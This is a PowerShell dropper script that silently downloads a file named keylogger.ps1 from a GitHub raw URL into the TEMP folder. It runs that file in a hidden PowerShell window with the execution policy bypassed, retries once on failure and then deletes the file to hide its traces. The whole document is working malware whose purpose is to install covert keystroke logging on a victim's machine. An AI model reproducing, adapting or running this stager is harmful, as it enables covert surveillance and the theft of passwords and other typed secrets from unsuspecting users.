# Run silently
$ErrorActionPreference = 'SilentlyContinue'

# Keylogger URL
$keyloggerUrl = 'https://raw.githubusercontent.com/haquefahimul65/xxxxxxxxxxx/refs/heads/main/keylogger.ps1'
$keyloggerPath = "$env:TEMP\keylogger.ps1"

# Download keylogger
try {
    Invoke-WebRequest -Uri $keyloggerUrl -OutFile $keyloggerPath -UseBasicParsing
    # Execute keylogger in a hidden PowerShell process
    Start-Process -FilePath powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$keyloggerPath`"" -WindowStyle Hidden
}
catch {
    Start-Sleep -Seconds 5
    try {
        Invoke-WebRequest -Uri $keyloggerUrl -OutFile $keyloggerPath -UseBasicParsing
        Start-Process -FilePath powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$keyloggerPath`"" -WindowStyle Hidden
    }
    catch {}
}
finally {
    if (Test-Path $keyloggerPath) {
        Remove-Item -Path $keyloggerPath -Force
    }
}
